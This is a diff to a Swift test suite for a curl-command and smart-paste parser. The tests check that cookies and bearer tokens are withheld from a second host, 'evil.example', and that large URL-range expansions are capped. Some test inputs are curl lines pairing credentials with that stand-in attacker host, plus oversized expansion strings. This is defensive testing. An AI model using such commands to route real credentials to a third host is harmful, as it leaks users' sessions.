@@ -64,8 +64,49 @@ import Testing
     }
 
     @Test func unknownOptionDoesNotExposeAttachedSecret() throws {
-        let result = try CurlCommandParser.parse("curl -usecret https://example.com/file")
+        let result = try CurlCommandParser.parse("curl https://example.com/file -usecret")
         #expect(result.unknownOptions == ["-u"])
+    }
+
+    @Test func unknownOptionURLIsNeverADownload() throws {
+        let result = try CurlCommandParser.parse("curl https://good.example/file -b 'sid=secret' --data 'https://evil.example/'")
+        #expect(result.urls == ["https://good.example/file"])
+        #expect(SmartPasteParser.parse("curl https://good.example/file --output https://evil.example/").flatMap(\.links).count == 1)
+    }
+
+    @Test func mixedHostsDoNotShareCredentials() {
+        let rows = SmartPasteParser.parse("curl https://good.example/one --url https://evil.example/two --url https://GOOD.example/three -b sid=secret -H 'Authorization: Bearer test'")
+        let entries = rows.flatMap { row in row.links.map { ($0.original, row.context, row.message) } }
+        #expect(entries.count == 3)
+        for (url, context, message) in entries {
+            if URL(string: url)?.host?.lowercased() == "evil.example" {
+                #expect(context.requestCookie == nil)
+                #expect(context.headers["Authorization"] == nil)
+                #expect(message.contains("登录凭据"))
+            } else {
+                #expect(context.requestCookie == "sid=secret")
+                #expect(context.headers["Authorization"] == "Bearer test")
+            }
+        }
+    }
+
+    @Test func totalExpansionLimitAcrossRows() {
+        let rows = SmartPasteParser.parse("https://example.com/[1-1000].bin\nhttps://example.com/[1-1000].bin")
+        #expect(rows.flatMap(\.links).isEmpty)
+        #expect(rows.last?.message.contains("1000") == true)
+    }
+
+    @Test func totalExpansionStopsBeforeAllocatingAllURLs() {
+        let text = Array(repeating: "https://example.com/[1-1000].bin", count: 10_000).joined(separator: "\n")
+        let start = ContinuousClock.now
+        let rows = SmartPasteParser.parse(text)
+        #expect(start.duration(to: .now) < .seconds(1))
+        #expect(rows.flatMap(\.links).isEmpty)
+        #expect(rows.last?.message.contains("1000") == true)
+        let curl = "curl " + Array(repeating: "https://example.com/[1-1000].bin", count: 10_000).joined(separator: " ")
+        let curlStart = ContinuousClock.now
+        #expect(SmartPasteParser.parse(curl).flatMap(\.links).isEmpty)
+        #expect(curlStart.duration(to: .now) < .seconds(1))
     }
 
     @Test func wildcardPaddingProductAndBoundaries() throws {
